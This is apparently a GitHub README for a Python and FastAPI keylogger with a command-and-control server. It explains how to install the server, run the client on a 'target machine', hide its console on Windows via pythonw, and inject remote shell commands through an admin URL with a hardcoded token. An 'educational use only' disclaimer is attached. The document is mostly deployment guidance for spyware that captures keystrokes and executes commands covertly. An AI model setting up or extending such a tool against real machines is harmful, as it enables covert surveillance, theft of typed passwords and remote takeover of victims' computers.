# C2 Command & Control Keylogger Framework (Educational)

A lightweight, cross-platform Command & Control (C2) system built with Python and FastAPI.  
The client (keylogger) sends keystrokes to the server and polls for remote commands.  
**For educational and authorized testing use only.**

## 🚀 Features
- ✅ Cross-platform (Windows & Linux)
- ✅ Real-time keystroke logging & HTTP streaming
- ✅ Command polling (polling-based C2)
- ✅ Remote command execution (`whoami`, `dir`/`ls`, etc.)
- ✅ Admin endpoint to inject commands (`/admin/add`)
- ✅ In-memory storage (easy to restart)

## 📦 Tech Stack
- **Backend:** FastAPI, Uvicorn
- **Client:** `pynput`, `requests`, `subprocess`
- **Future:** AES-256 GCM encryption (coming soon)

## 🔧 Installation

1. Clone the repo:
   ```bash
   git clone https://github.com/noobuser978-gif/C2C-Keylogger
   cd C2C-Keylogger
   ```
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
## ▶️ Running the Server
 - Start the FastAPI server (keep this terminal open):
  ```bash
  uvicorn server:app --reload
  ```
 - The server will run at http://localhost:8000.
## 💻 Running the Client (Target Machine)
 - On the machine you want to monitor, run:
   ```bash
   python keylogger.py        # or python3 on Linux
   ```
💡 On Windows, you can hide the console by renaming the file to keylogger.pyw and running pythonw keylogger.pyw.
- The client will print its unique client ID – make a note of it (e.g., a1b2c3d4).
## 🕹️ Usage – Injecting Commands
Once the client is running, open your browser and visit the following URL (replace YOUR_ID with the actual client ID):
```bash
http://localhost:8000/admin/add?client_id=YOUR_ID&command=whoami&token=secret123
```
Wait 10 seconds – the command output will appear in the server terminal.
You can send any command that works on the target OS:
 - Windows: ipconfig, dir, whoami
 - Linux: ifconfig, ls, whoami

## 📜 License
MIT License – see the LICENSE file for details.

## ⚠️ Disclaimer
This project is strictly for educational purposes and authorized penetration testing only.
Do not use it on any system without explicit permission. The author is not responsible for any misuse.
